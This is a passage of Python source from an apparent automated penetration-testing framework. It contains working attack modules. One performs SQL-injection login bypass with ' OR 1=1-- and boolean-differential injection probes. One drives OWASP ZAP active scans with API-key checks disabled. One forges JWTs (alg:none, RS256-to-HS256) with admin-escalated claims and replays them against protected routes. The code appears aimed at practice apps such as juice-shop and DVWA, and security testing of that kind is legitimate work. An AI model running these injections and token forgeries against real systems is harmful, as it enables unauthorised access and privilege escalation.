      * CONFIDENCE-GATE the surface rewrite (conf>=2) so a FAILED login discovery never forces an attack
        at a non-auth endpoint.
    Gate AEGIS_MOVE_NORMALIZE=0."""
    if not isinstance(move, dict):
        return move
    if str(os.environ.get("AEGIS_MOVE_NORMALIZE", "1")).lower() in ("0", "false", "no", "off"):
        return move
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or ""
    act = move.get("action") or "web"
    surface = move.get("surface") or move.get("path") or ""
    blob = _move_blob(move)
    login_surf = _looks_login(surface)
    authbypass = any(h in blob for h in _AUTHBYPASS_HINTS) or bool(move.get("auth_bypass"))
    sqli = any(h in blob for h in _SQLI_HINTS) or "sql" in (move.get("vuln_class") or "").lower()
    need_login = authbypass or login_surf
    real, conf = _discover_login(base, with_conf=True) if (need_login or (sqli and login_surf)) else (surface, 0)
    # (A) GENERIC auth-bypass / sqli-on-login move -> re-route to the purpose-built sql_raw leg.
    if (authbypass or (sqli and login_surf)) and act in _GENERIC_ACTIONS:
        move["action"] = "sql_raw"; move["auth_bypass"] = True
        if conf >= 2:
            move["surface"] = real; (ctx or {})["login_surface"] = real
        return move
    # (B) an already-sql_raw auth-bypass/login move (e.g. the planner anchor) -> fix its surface only.
    if act == "sql_raw" and need_login and conf >= 2:
        move["surface"] = real; (ctx or {})["login_surface"] = real
        return move
    # (C) explicit SQLi on a read handler -> sql_raw boolean-diff arm (keep the surface).
    if sqli and act in ("web", "fact", "authz", ""):
        move["action"] = "sql_raw"
        return move
    # (D) EXPLICIT login-targeted leg (rate/front_door/session_fixation) -> keep its action, only aim it at
    #     the REAL login (preserve intent; board: multiple legs per class). Confidence-gated.
    if login_surf and act in ("rate", "front_door", "session_fixation", "web", "authz", "authz_fuzz"):
        if conf >= 2 and real != surface:
            move["surface"] = real; (ctx or {})["login_surface"] = real
    return move


def _bo_authed(r, j):
    """Heuristic: does this response represent an authenticated session (a token we didn't earn)?
    Returns (authed:bool, token_sample:str). Looks for a token/jwt field, a bare JWT anywhere, or a
    session cookie on a 2xx -- enough to tell 'the server issued a session' from 'rejected'."""
    if r is None:
        return False, ""
    import json as _j, re as _re
    try:
        blob = _j.dumps(j) if j is not None else (r.text or "")[:4000]
    except Exception:
        blob = (r.text or "")[:4000]
    m = _re.search(r'"(?:token|access_token|accessToken|authentication|jwt|id_token)"\s*:\s*"?([A-Za-z0-9._\-]{20,})', blob)
    if m:
        return True, m.group(1)[:40]
    m2 = _re.search(r'\beyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', blob)   # a bare JWT
    if m2:
        return True, m2.group(0)[:40]
    if 200 <= getattr(r, "status_code", 0) < 300:
        sc = r.headers.get("set-cookie", "") if getattr(r, "headers", None) else ""
        if _re.search(r'(?i)(session|sid|jwt|token|connect\.sid|auth)=[^;]+', sc):
            return True, "cookie"
    return False, ""


def _login_inject(sess, base, path, ident):
    """POST one identity value to the login endpoint; report whether it yielded a session."""
    import os as _os
    idf = _os.environ.get("AEGIS_ID_FIELD", "email")
    pwf = _os.environ.get("AEGIS_PW_FIELD", "password")
    url = _os.environ.get("AEGIS_LOGIN_URL") or (base.rstrip("/") + path)
    try:
        r = sess.request("POST", url, json={idf: ident, pwf: str(_os.environ.get("AEGIS_TEST_PIN", "x"))},
                         timeout=20, verify=False)
        try: j = r.json()
        except Exception: j = None
        return _bo_authed(r, j)
    except Exception:
        return (False, "")


def sql_raw(move, ctx):
    """SQL-RAW injection. Two arms: (1) AUTH-BYPASS on a login endpoint -- a tautology (`' OR 1=1--`) in the
    identity field issues a SESSION that neither a bogus credential nor a FALSE-condition injection does
    (SqlAuthBypassOracle, high-conf sqlraw@); (2) boolean-differential on a $queryRaw read handler --
    value+' AND 1=1' vs ' AND 1=2' vs control (SqlRawOracle, DB-witnessed for HIGH). SELECT/read-only,
    non-destructive. The login arm fires when the surface looks like a login endpoint or move['auth_bypass']."""
    import json as _json
    from urllib.parse import quote as _q
    base, sess = _bo_sess(move, ctx)
    path = move.get("surface") or move.get("path") or "/"
    # ---- ARM 1: login auth-bypass (juice-shop shape: ' OR 1=1-- in the email returns an admin JWT) ----
    if move.get("auth_bypass") or _looks_login(path):
        from verified_findings import SqlAuthBypassOracle
        bypass_authed, tok = _login_inject(sess, base, path, "' OR 1=1--")
        control_authed, _c = _login_inject(sess, base, path, "' OR 1=2--")
        import random as _rnd
        baseline_authed, _b = _login_inject(sess, base, path, "nulluser_%d@example.invalid" % _rnd.randint(1, 1_000_000))
        av, ar = SqlAuthBypassOracle(bypass_authed=bypass_authed, baseline_authed=baseline_authed,
                                     control_authed=control_authed, token_sample=tok, surface=path).check()
        aq = {"verdict": av, "surface": path, "arm": "auth-bypass", "oracle_id": "sqlraw@authbypass",
              "bypass_authed": bypass_authed, "control_authed": control_authed,
              "baseline_authed": baseline_authed, **ar}
        # if the login arm is conclusive (verified/inconclusive), return it; a rejected login arm still
        # returns (a login endpoint has no meaningful GET boolean-diff arm to fall through to).
        return {"status": 200, "body": _json.dumps(aq)[:2000], "sql_raw": aq,
                "sql_raw_verified": av == "verified"}
    # ---- ARM 2: boolean-differential on a read handler ----
    param = move.get("param", "q"); val = str(move.get("value", "1"))
    def _probe(cond):
        _r, _j = _bo_get(sess, base.rstrip("/") + path + f"?{param}=" + _q(val + cond))
        return _bo_ids(_j)
    t, f, c = _probe(" AND 1=1-- "), _probe(" AND 1=2-- "), _probe("")
    from verified_findings import SqlRawOracle
    verdict, receipt = SqlRawOracle(t, f, c, db_confirmed=bool(move.get("db_confirmed")), surface=path).check()
    sq = {"verdict": verdict, "surface": path, "oracle_id": "sqlraw@1",
          "true": len(t), "false": len(f), "control": len(c), **receipt}
    return {"status": 200, "body": _json.dumps(sq)[:2000], "sql_raw": sq,
            "sql_raw_verified": verdict == "verified"}


# ---- G56: OWASP ZAP as an oracle-gated LEAD source. ZAP's mature spider + passive/active scanner has the
# app-agnostic detection breadth our hand-built oracles lack (juice-shop proof: 0/6 even given the surface).
# Per doctrine ZAP alerts are LEADS (confirmation #1), NOT verified on their own -- the oracle() branch
# re-confirms deterministic classes (headers/cookies/exposure) with our own oracle (confirmation #2) and
# keeps heuristic ones (xss/sqli) as leads for the matching probe. Baseline (spider+passive) is non-
# destructive; active scan (AEGIS_ZAP_MODE=full) submits forms -> gated. Runs the zaproxy/zap image in Kali.
_ZAP_CLASS = [  # (substring in pluginid/name/alert -> our class)
    ("cross site scripting", "xss"), ("40012", "xss"), ("40014", "xss"), ("40016", "xss"), ("40017", "xss"),
    ("sql injection", "injection"), ("40018", "injection"), ("40019", "injection"), ("40020", "injection"),
    ("path traversal", "injection"), ("remote os command", "injection"), ("90020", "injection"),
    ("content security policy", "security_headers"), ("csp:", "security_headers"), ("x-frame-options", "security_headers"),
    ("strict-transport", "security_headers"), ("x-content-type", "security_headers"), ("10020", "security_headers"),
    ("10021", "security_headers"), ("10035", "security_headers"), ("10038", "security_headers"),
    ("cookie", "security_headers"), ("10010", "security_headers"), ("10011", "security_headers"), ("10054", "security_headers"),
    ("directory browsing", "info_disclosure"), ("information disclosure", "info_disclosure"),
    ("backup file", "info_disclosure"), ("10095", "info_disclosure"), ("10096", "info_disclosure"),
    ("session id", "auth_session"), ("jwt", "auth_session"), ("json web token", "auth_session"),
]


def _zap_class(pluginid, name, alert):
    blob = f"{pluginid} {name} {alert}".lower()
    for sub, cls in _ZAP_CLASS:
        if sub in blob:
            return cls
    return "misc"


# G56b: SEEDED-scan support. On SPAs (juice-shop/Angular) ZAP's AJAX spider finds URLs but NOT the
# parameterized API requests -- especially POST bodies (the login auth-bypass SQLi lives in a JSON body).
# So a naive active scan finds 0 injection. We replay a per-target seed set of parameterized requests into
# ZAP so its active scanner has real vectors, then scan. Seeds come from ctx, an env file/profile, or an
# auto-matched operator/zap_seeds/<name>.json (matched by a marker in the target's root HTML). Generic:
# unknown targets match nothing -> zero seeds -> the classic one-shot path runs unchanged.
_ZAP_DRIVE_PY = r'''
import sys, json, time, urllib.request, urllib.parse
from urllib.parse import urlsplit
base, mins, ajax, full, timeout = sys.argv[1], int(sys.argv[2]), sys.argv[3]=="1", sys.argv[4]=="1", int(sys.argv[5])
port = sys.argv[6] if len(sys.argv) > 6 else "8090"      # per-run isolation so parallel ZAP legs don't collide
W = sys.argv[7] if len(sys.argv) > 7 else "/tmp/zapwrk"  # per-run work dir
Z = "http://localhost:%s" % port
LOG = open(W + "/drive.log", "w", encoding="utf-8")
def log(m):
    LOG.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), m)); LOG.flush()
def api(p, tmo=60):
    try: return urllib.request.urlopen(Z + "/" + p, timeout=tmo).read().decode("utf-8", "replace")
    except Exception as e: return "__ERR__:" + str(e)[:120]
def apij(p):
    try: return json.loads(api(p))
    except Exception: return {}
def q(d): return urllib.parse.urlencode(d)
# readiness: wait for the API, THEN for a working accessUrl (version answers before ZAP can seed -> 500s)
for _ in range(60):
    if "version" in api("JSON/core/view/version/"): break
    time.sleep(3)
for _ in range(20):
    r = api("JSON/core/action/accessUrl/?" + q({"url": base, "followRedirects": "true"}))
    if "__ERR__" not in r and "does_not_exist" not in r: log("ready (accessUrl base ok)"); break
    time.sleep(3)
# --- optional authentication (auth.json): log in (+ run any setup), then inject the resulting session
# cookie on EVERY ZAP request via Replacer so spider/seed/scan reach the authenticated surface. Targets
# with no auth block (e.g. juice-shop) skip this entirely. ---
try: _auth = json.load(open(W + "/auth.json"))
except Exception: _auth = {}
if _auth:
    import http.cookiejar, re as _re, ssl as _ssl
    _cj = http.cookiejar.CookieJar()
    _ctx = _ssl.create_default_context(); _ctx.check_hostname = False; _ctx.verify_mode = _ssl.CERT_NONE
    _op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(_cj), urllib.request.HTTPSHandler(context=_ctx))
    _ctype = _auth.get("ctype", "application/x-www-form-urlencoded")   # e.g. application/json for API logins
    def _abs(p): return p if p.startswith("http") else base.rstrip("/") + "/" + p.lstrip("/")
    def _hget(u):
        try: return _op.open(_abs(u), timeout=20).read().decode("utf-8", "replace")
        except Exception: return ""
    def _hpost(u, data):
        try:
            _rq = urllib.request.Request(_abs(u), data=data.encode("utf-8")); _rq.add_header("Content-Type", _ctype)
            return _op.open(_rq, timeout=20).read().decode("utf-8", "replace")
        except Exception: return ""
    def _step(url, post_url, post_data, tf, tr):
        h = _hget(_abs(url)); data = post_data or ""
        if tf and tr:
            m = _re.search(tr, h); data += "&%s=%s" % (tf, m.group(1) if m else "")
        _hpost(post_url or url, data)
    def _login():
        _step(_auth.get("login_url", "/login.php"), _auth.get("post_url"), _auth.get("post_data"),
              _auth.get("token_field"), _auth.get("token_regex"))
    _login()
    for st in (_auth.get("setup") or []):
        _step(st.get("url", "/"), st.get("post_url"), st.get("post_data"), st.get("token_field"), st.get("token_regex"))
        log("auth setup %s done" % st.get("url"))
    if _auth.get("relogin_after_setup"): _login()
    _pairs = ["%s=%s" % (c.name, c.value) for c in _cj]
    for k, v in (_auth.get("cookies") or {}).items(): _pairs.append("%s=%s" % (k, v))
    _cookie = "; ".join(_pairs)
    api("JSON/replacer/action/addRule/?" + q({"description": "aegis-auth", "enabled": "true",
        "matchType": "REQ_HEADER", "matchString": "Cookie", "matchRegex": "false", "replacement": _cookie}))
    # don't let the scanner log itself out or reset the app
    for _rgx in (_auth.get("exclude") or [".*logout.*", ".*setup\\.php.*", ".*security\\.php.*"]):
        api("JSON/spider/action/excludeFromScan/?" + q({"regex": _rgx}))
        api("JSON/ascan/action/excludeFromScan/?" + q({"regex": _rgx}))
    log("auth done; cookie=%s" % _cookie)
api("JSON/spider/action/scan/?" + q({"url": base, "maxChildren": "15", "recurse": "true"}))
t0 = time.time()
while time.time() - t0 < max(60, mins * 60):
    if apij("JSON/spider/view/status/").get("status") == "100": break
    time.sleep(3)
if ajax:                                              # AJAX spider -- SPA discovery (helps passive + GET surface)
    api("JSON/ajaxSpider/action/scan/?" + q({"url": base, "inScope": "false"}))
    t0 = time.time()
    while time.time() - t0 < 240:
        if apij("JSON/ajaxSpider/view/status/").get("status") == "stopped": break
        time.sleep(5)
    api("JSON/ajaxSpider/action/stop/")
try: seeds = json.load(open(W + "/seeds.json"))
except Exception: seeds = []
host = urlsplit(base).netloc
def in_tree(key):
    return any(key in u for u in apij("JSON/core/view/urls/?" + q({"baseurl": base})).get("urls", []))
# ROBUST replay: retry each seed until it lands in the tree (accessUrl/sendRequest 500 on a not-yet-ready daemon)
for s in seeds:
    m = (s.get("method") or "GET").upper()
    path = s.get("path") or "/"
    if path.startswith("http"):
        sp = urlsplit(path); reqpath = sp.path + (("?" + sp.query) if sp.query else ""); url = path
    else:
        reqpath = path if path.startswith("/") else "/" + path; url = base.rstrip("/") + reqpath
    key = reqpath.split("?")[0]
    ok = False
    for _ in range(4):
        if m == "GET":
            r = api("JSON/core/action/accessUrl/?" + q({"url": url, "followRedirects": "true"}))
        else:
            body = s.get("body", ""); ctype = s.get("ctype", "application/json")
            raw = "%s %s HTTP/1.1\r\nHost: %s\r\nContent-Type: %s\r\nContent-Length: %d\r\n\r\n%s" % (
                m, reqpath, host, ctype, len(body.encode("utf-8")), body)
            r = api("JSON/core/action/sendRequest/?" + q({"request": raw, "followRedirects": "true"}))
        if "__ERR__" not in r and in_tree(key): ok = True; break
        time.sleep(2)
    log("seed %s %s -> %s" % (m, reqpath, "OK" if ok else "FAILED"))
if full:                                              # active scan: seed the tree, then ONE recurse scan
    # from base with DEFAULT options. This is the config proven (wide scan) to surface BOTH the search-q
    # GET SQLi and the login-email JSON-POST SQLi -- both appear early (well before the scan's ~36% plateau
    # on the slow time-based rule). We do NOT cap per-rule time (that was observed to suppress the login
    # detection) or widen injectable/RPC (dilutes/misfires); we just let the outer `timeout` bound the wait
    # and generate the report from whatever was found by then.
    r = apij("JSON/ascan/action/scan/?" + q({"url": base, "recurse": "true", "inScopeOnly": "false"}))
    sid = r.get("scan")
    log("recurse ascan id=%s" % sid)
    if str(sid).isdigit():
        t0 = time.time()
        while time.time() - t0 < timeout:
            st = apij("JSON/ascan/view/status/?" + q({"scanId": sid})).get("status")
            log("ascan %s%%" % st)
            if st == "100": break
            time.sleep(8)
    api("JSON/ascan/action/stopAllScans/")            # free the daemon so report generation is reliable
# Build report.json in the classic zap-full-scan shape from the RELIABLE alerts view. (OTHER/jsonreport
# can time out while a scan is still active -- that silently produced empty reports.)
_al = apij("JSON/core/view/alerts/?" + q({"baseurl": base, "start": "0", "count": "99999"})).get("alerts", [])
_site = [{"@name": base, "alerts": [
    {"pluginid": a.get("pluginId", ""), "name": a.get("name", ""), "alert": a.get("alert", ""),
     "riskdesc": a.get("risk", ""), "confidence": a.get("confidence", ""),
     "instances": [{"uri": a.get("url", ""), "param": a.get("param", "")}]} for a in _al]}]
open(W + "/report.json", "w", encoding="utf-8").write(json.dumps({"site": _site}))
log("report written: %d alerts" % len(_al))
LOG.close()
'''


def _zap_fetch_root(base):
    try:
        import urllib.request, ssl
        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        return urllib.request.urlopen(base, timeout=8, context=ctx).read(200000).decode("utf-8", "replace")
    except Exception:
        return ""


def _zap_seed_dir():
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), "zap_seeds")


def _zap_seeds(base, ctx):
    """Gather ZAP seed requests {method, path, body?, ctype?} from ctx['zap_seeds']/ctx['seeds'],
    AEGIS_ZAP_SEED_FILE, AEGIS_ZAP_SEED_PROFILE, or an auto-matched profile in operator/zap_seeds/
    (by a 'match' marker in the target root HTML; disable with AEGIS_ZAP_SEED_AUTO=0)."""
    seeds = []
    for s in ((ctx or {}).get("zap_seeds") or (ctx or {}).get("seeds") or []):
        if isinstance(s, str): seeds.append({"method": "GET", "path": s})
        elif isinstance(s, dict) and s.get("path"): seeds.append(s)
    files = []
    f = os.environ.get("AEGIS_ZAP_SEED_FILE")
    if f and os.path.exists(f): files.append(f)
    prof = os.environ.get("AEGIS_ZAP_SEED_PROFILE")
    if prof:
        p = os.path.join(_zap_seed_dir(), prof + ".json")
        if os.path.exists(p): files.append(p)
    pdir = _zap_seed_dir()
    if not files and os.path.isdir(pdir) and os.environ.get("AEGIS_ZAP_SEED_AUTO", "1") != "0":
        html = _zap_fetch_root(base)
        if html:
            for fn in sorted(glob.glob(os.path.join(pdir, "*.json"))):
                try: j = json.load(open(fn, encoding="utf-8"))
                except Exception: continue
                if any(str(m).lower() in html.lower() for m in (j.get("match") or [])):
                    files.append(fn); break
    for fn in files:
        try:
            for s in (json.load(open(fn, encoding="utf-8")).get("seeds") or []):
                if s.get("path"): seeds.append(s)
        except Exception: pass
    seen, out = set(), []
    for s in seeds:
        k = ((s.get("method") or "GET").upper(), s.get("path"))
        if k not in seen: seen.add(k); out.append(s)
    return out


def _zap_profile_files(base, ctx):
    """Resolve the seed-profile files that apply to this target: explicit AEGIS_ZAP_SEED_FILE /
    AEGIS_ZAP_SEED_PROFILE, else the auto-matched profile(s) in operator/zap_seeds/ (by 'match' marker
    in the target root HTML). Shared by _zap_seeds (for seeds) and _zap_auth (for the auth block)."""
    files = []
    f = os.environ.get("AEGIS_ZAP_SEED_FILE")
    if f and os.path.exists(f): files.append(f)
    prof = os.environ.get("AEGIS_ZAP_SEED_PROFILE")
    if prof:
        p = os.path.join(_zap_seed_dir(), prof + ".json")
        if os.path.exists(p): files.append(p)
    pdir = _zap_seed_dir()
    if not files and os.path.isdir(pdir) and os.environ.get("AEGIS_ZAP_SEED_AUTO", "1") != "0":
        html = _zap_fetch_root(base)
        if html:
            for fn in sorted(glob.glob(os.path.join(pdir, "*.json"))):
                try: j = json.load(open(fn, encoding="utf-8"))
                except Exception: continue
                if any(str(m).lower() in html.lower() for m in (j.get("match") or [])):
                    files.append(fn); break
    return files


def _zap_auth(base, ctx):
    """Return the 'auth' block (login flow / setup / cookies) from ctx or the matched seed profile, or {}.
    Targets with no auth block (e.g. juice-shop) get {} -> the driver skips authentication entirely."""
    if (ctx or {}).get("zap_auth"): return ctx["zap_auth"]
    for fn in _zap_profile_files(base, ctx):
        try:
            a = json.load(open(fn, encoding="utf-8")).get("auth")
            if a: return a
        except Exception: pass
    return {}


def _zap_daemon_cmd(base, seeds, auth, img, mem, heap, mins, ajax_on, full, timeout):
    """Bash (run on the Kali host by _kali): start a ZAP daemon, spider+ajax, replay the seed requests,
    active-scan (default policy) if full, write /tmp/zapwrk/report.json, print it (same stdout contract
    as the one-shot path). Robust to scanner hangs -- the internal poll is time-capped and the report is
    generated from whatever was found."""
    sq = shlex.quote
    # per-run isolation: unique port (AEGIS_ZAP_PORT), work dir /tmp/zapwrk-<port>, and container name
    # aegis-zap-leg-<port>, so two concurrent ZAP legs (parallel campaigns) can't collide on name/port/dir.
    port = str(int(os.environ.get("AEGIS_ZAP_PORT", "8090")))
    W = "/tmp/zapwrk-" + port
    name = "aegis-zap-leg-" + port
    # NOTE: 0700 would block the container's non-root `zap` user from writing the bind-mount; the dir is
    # per-run and rm-rf'd each invocation (ephemeral) in the contained single-user Kali VM, so 0777 here is
    # scoped rather than a shared world-writable path. (Board A3 flagged the old shared /tmp/zapwrk 0777.)
    return (
        "set -u; rm -rf " + sq(W) + "; mkdir -p " + sq(W) + " && chmod 777 " + sq(W) + "; "
        "cat > " + sq(W) + "/seeds.json <<'AEGIS_SEEDS_EOF'\n" + json.dumps(seeds) + "\nAEGIS_SEEDS_EOF\n"
        "cat > " + sq(W) + "/auth.json <<'AEGIS_AUTH_EOF'\n" + json.dumps(auth or {}) + "\nAEGIS_AUTH_EOF\n"
        "cat > " + sq(W) + "/drive.py <<'AEGIS_DRIVE_EOF'\n" + _ZAP_DRIVE_PY + "\nAEGIS_DRIVE_EOF\n"
        "docker rm -f " + sq(name) + " >/dev/null 2>&1; "
        "docker run -d --name " + sq(name) + " --network host --memory=" + sq(mem) +
        " -e JAVA_OPTS=" + sq("-Xmx" + heap) + " -v " + sq(W) + ":/zap/wrk/:rw " + sq(img) +
        " zap.sh -daemon -host 0.0.0.0 -port " + port + " -config api.disablekey=true "
        "-config api.addrs.addr.name=.* -config api.addrs.addr.regex=true >/dev/null 2>&1; "
        "python3 " + sq(W) + "/drive.py " + sq(base) + " " + str(int(mins)) + " " +
        ("1" if ajax_on else "0") + " " + ("1" if full else "0") + " " + str(int(timeout)) + " " + port + " " + sq(W) + " >/dev/null 2>&1; "
        "docker rm -f " + sq(name) + " >/dev/null 2>&1; "
        "cat " + sq(W) + "/report.json 2>/dev/null | head -c 400000"
    )


def zap(move, ctx):
    """Run OWASP ZAP (baseline spider+passive by default; full active if AEGIS_ZAP_MODE=full) against the
    target and return its alerts as LEADS (result['zap'])."""
    import json as _json
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    if os.environ.get("AEGIS_ZAP", "1") == "0":
        return {"status": 200, "body": "[zap] disabled", "zap": {"scanned": False, "alerts": []}}
    img = os.environ.get("AEGIS_ZAP_IMAGE", "zaproxy/zap-stable")
    script = "zap-full-scan.py" if os.environ.get("AEGIS_ZAP_MODE", "baseline") == "full" else "zap-baseline.py"
    mins = int(os.environ.get("AEGIS_ZAP_MINUTES", "5"))
    # -I: don't fail on warnings; -m: spider minutes; -J: json report into the mounted wrk dir
    # 8GB box: cap the container + JVM heap so ZAP can't OOM the WSL cgroup (AEGIS_ZAP_MEM overridable).
    mem = os.environ.get("AEGIS_ZAP_MEM", "1600m"); heap = os.environ.get("AEGIS_ZAP_HEAP", "1024m")
    # -j: AJAX SPIDER (drives a real browser) -- REQUIRED for SPAs (Angular/React) whose endpoints the
    # traditional spider can't reach; without it an active scan finds 0 on juice-shop-class apps. Default on;
    # AEGIS_ZAP_AJAX=0 to disable (lighter, for classic server-rendered targets).
    ajax = "-j " if os.environ.get("AEGIS_ZAP_AJAX", "1") != "0" else ""
    full = os.environ.get("AEGIS_ZAP_MODE", "baseline") == "full"
    timeout = int(os.environ.get("AEGIS_ZAP_TIMEOUT", str(mins * 60 + 240)))  # active scan needs its own budget
    # G56b: if a seed set applies to this target, drive a ZAP daemon and REPLAY the seeds (so the active
    # scanner sees the parameterized/POST vectors the AJAX spider can't). Otherwise the classic one-shot
    # zap-full-scan/baseline path (behaviour unchanged for unseeded targets).
    seeds = _zap_seeds(base, ctx)
    auth = _zap_auth(base, ctx)                        # login/setup/cookie flow (e.g. DVWA); {} if none
    if seeds or auth or os.environ.get("AEGIS_ZAP_DAEMON") == "1":
        cmd = _zap_daemon_cmd(base, seeds, auth, img, mem, heap, mins, ajax != "", full, timeout)
        out = _kali(cmd, timeout + max(600, mins * 60 + 300))   # outer budget over the daemon's internal caps
    else:
        cmd = (f"mkdir -p /tmp/zapwrk && chmod 777 /tmp/zapwrk && "
               f"docker run --rm --network host --memory={mem} -e JAVA_OPTS='-Xmx{heap}' -v /tmp/zapwrk:/zap/wrk/:rw {img} {script} "
               f"-t {base} -J report.json -m {mins} {ajax}-I -d 2>/dev/null; cat /tmp/zapwrk/report.json 2>/dev/null | head -c 400000")
        out = _kali(cmd, timeout)
    alerts = []
    try:
        import re as _re2
        mm = _re2.search(r"\{.*\}", out, _re2.S)
        d = _json.loads(mm.group(0)) if mm else {}
        for site in d.get("site", []):
            for a in site.get("alerts", []):
                pid = str(a.get("pluginid", "")); name = a.get("name", "") or a.get("alert", "")
                inst = a.get("instances") or [{}]
                uri = (inst[0].get("uri") if inst else "") or base
                alerts.append({"pluginid": pid, "name": name, "risk": a.get("riskdesc", ""),
                               "confidence": a.get("confidence", ""), "url": uri,
                               "class": _zap_class(pid, name, a.get("alert", "")),
                               "param": (inst[0].get("param") if inst else "") or ""})
    except Exception as e:
        return {"status": 200, "body": f"[zap] parse error {str(e)[:60]}", "zap": {"scanned": False, "alerts": []}}
    scanned = bool(alerts) or ("PASS" in out or "WARN" in out or "FAIL" in out)
    return {"status": 200 if not alerts else 300, "body": f"zap: {len(alerts)} alert(s)",
            "zap": {"scanned": scanned, "alerts": alerts, "mode": script}}


def jwt_leg(move, ctx):
    """JWT signature-bypass forgery (broken-auth class). RELEVANCY-GATED, not a blanket cannon: it only
    does anything when the TARGET actually issued a JWT (lifted from the role session's bearer, or seen on a
    whoami/profile surface). No JWT -> cheap n/a, never a false positive. When a JWT exists it forges the two
    classic key-independent bypasses (alg:none always; RS256->HS256 only when a public key is known) with
    ESCALATED claims, replays each against a PROTECTED route alongside a NO-TOKEN control, and the oracle
    verifies ONLY the deterministic differential: forged token ACCEPTED (2xx) while the control is DENIED
    (401/403). Non-destructive (a claim change + GETs). jingle-free; pure jwt_forge crafters do the minting."""
    import json as _j, re as _re, requests
    try:
        import jwt_forge as _jf
    except Exception as e:
        return {"status": 200, "body": f"[jwt] jwt_forge unavailable: {e}",
                "jwt": {"verdict": "n/a", "note": "crafter import failed"}, "jwt_verified": False}
    base = (ctx or {}).get("base") or move.get("target") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    base = base.rstrip("/")
    sf = (ctx or {}).get("session_for_role")
    role = move.get("role", "owner")
    try:
        s = sf(role) if sf else requests.Session()
    except Exception:
        s = requests.Session()
    auth_hdr = os.environ.get("AEGIS_AUTH_HEADER", "Authorization")
    _JWT = r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'
    # 1. RELEVANCY GATE: obtain a REAL JWT the target issued.
    token = move.get("token")
    if not token:
        try:
            m = _re.search(_JWT, s.headers.get(auth_hdr) or "")
            if m:
                token = m.group(0)
        except Exception:
            pass
    if not token:
        for pp in (move.get("surface"), move.get("path"), "/rest/user/whoami", "/api/me", "/profile", "/"):
            if not pp:
                continue
            try:
                r = s.get(base + "/" + str(pp).lstrip("/"), verify=False, timeout=12)
                m = _re.search(_JWT, r.text or "")
                if m:
                    token = m.group(0)
                    break
            except Exception:
                continue
    if not token or not str(token).startswith("eyJ"):
        return {"status": 200, "body": "[jwt] target issues no JWT on reachable surfaces -- not relevant (no cannon-fire)",
                "jwt": {"verdict": "n/a", "note": "no JWT observed"}, "jwt_verified": False}
    # 2. decode + build ESCALATED claims (non-destructive: a claim change only).
    try:
        _hdr, payload, _sig = _jf.decode_segments(token)
    except Exception as e:
        return {"status": 200, "body": f"[jwt] undecodable token: {e}",
                "jwt": {"verdict": "rejected", "note": "decode failed"}, "jwt_verified": False}
    esc = dict(payload) if isinstance(payload, dict) else {}
    for k in list(esc.keys()):
        if k.lower() in ("role", "roles", "isadmin", "is_admin", "admin", "scope", "authorities", "grp", "group", "type"):
            esc[k] = True if isinstance(esc[k], bool) else "admin"
    host = _re.sub(r'^https?://', '', base).split('/')[0].split(':')[0]
    if isinstance(esc.get("data"), dict):                      # juice-shop shape: data.email / data.role
        d = dict(esc["data"])
        if "email" in d:
            d["email"] = os.environ.get("AEGIS_ADMIN_EMAIL", "admin@" + host)
        if "role" in d:
            d["role"] = "admin"
        if "isAdmin" in d:
            d["isAdmin"] = True
        esc["data"] = d
    forgeries = _jf.craft_forgeries(esc, move.get("public_key_pem"))
    # 3. PROTECTED route + no-token control -> deterministic differential.
    route = move.get("verify_path") or move.get("surface") or move.get("path") or "/rest/admin/application-configuration"
    url = base + "/" + str(route).lstrip("/")
    try:
        ctrl_status = requests.get(url, verify=False, timeout=12).status_code
    except Exception:
        ctrl_status = -1
    attempts, verified, win = [], False, {}
    for vector, ftok in forgeries:
        try:
            fr = requests.get(url, headers={auth_hdr: "Bearer " + ftok}, verify=False, timeout=12)
            acc = 200 <= fr.status_code < 300
            attempts.append({"vector": vector, "status": fr.status_code, "accepted": acc})
            if acc and ctrl_status in (401, 403):
                verified, win = True, {"vector": vector, "forged_status": fr.status_code, "control_status": ctrl_status}
                break
        except Exception as e:
            attempts.append({"vector": vector, "error": str(e)[:80]})
    # REACHABILITY: a real HTTP code on the control OR any forged attempt means the route answered; if every
    # request errored (connection failure) the target is UNREACHABLE -> report status -1 so the reality/retest
    # layer treats it as inconclusive, never a false 'public'/'fixed'.
    reached = (ctrl_status not in (-1, None)) or any(isinstance(a.get("status"), int) for a in attempts)
    rec = {"verdict": "verified" if verified else "rejected", "route": route, "control_status": ctrl_status,
           "attempts": attempts, "forged_claims": {k: esc.get(k) for k in list(esc)[:6]}}
    rec.update(win)
    if not verified:
        if not reached:
            rec["note"] = "target unreachable (no HTTP response from route) -- inconclusive"
        elif ctrl_status not in (401, 403):
            rec["note"] = "control not denied (status %s) -- route is public, no bypass proven" % ctrl_status
        else:
            rec["note"] = "no forged token accepted"
    return {"status": (200 if reached else -1), "body": _j.dumps(rec)[:2000], "jwt": rec, "jwt_verified": verified}


def patch_diff_leg(move, ctx):
    """GROUNDED n-day DEVELOPER (patch_differ ladder, was shelf-ware). For a fingerprinted component+version
    it picks the rung -- public exploit / PATCH-DIFF / novel -- behind a fingerprint-TRUST gate (no blind
    diffing of a poisoned/unconfirmed version), then GROUNDS the code bench with the REAL artifacts: the
    security-relevant patch hunks (the fix reveals the bug) or the public PoC, so the probe is
    reverse-engineered from the actual diff rather than guessed from a CVE id. Synthesizes via novel_code and
    runs through the probe leg (its own probe_verified oracle). RELEVANCY: only a version'd component; the
    trust gate + repo map keep it from blind-firing. Offline-safe (plan() degrades rung by rung)."""
    import json as _j
    component = (move.get("component") or move.get("target") or "").lower().strip()
    version = str(move.get("version") or "").strip()
    if not component or not version:
        return {"status": 200, "body": "[patch_diff] no component+version -- not relevant",
                "patch_diff": {"mode": "n/a", "note": "missing component/version"}}
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or ""
    try:
        import patch_differ as _pd
    except Exception as e:
        return {"status": -1, "body": f"[patch_diff] patch_differ unavailable: {e}",
                "patch_diff": {"mode": "error"}}
    try:
